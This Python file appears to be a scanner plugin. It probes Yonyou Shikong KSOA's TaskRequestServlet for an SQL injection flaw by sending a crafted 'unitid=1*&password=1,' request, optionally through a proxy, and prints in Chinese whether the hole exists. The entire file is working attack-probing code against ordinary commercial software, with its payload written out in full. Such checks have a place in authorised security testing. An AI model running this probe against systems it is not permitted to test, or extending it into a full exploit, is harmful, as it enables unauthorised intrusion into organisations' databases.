import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        gf = requests.get(url+"servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,",cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf.encoding = 'utf-8'
        if 'error:' in gf.text:
            uia = "[+]漏洞存在\n/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,"
        else:
            uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 用友时空KSOA TaskRequestServlet sql注入漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)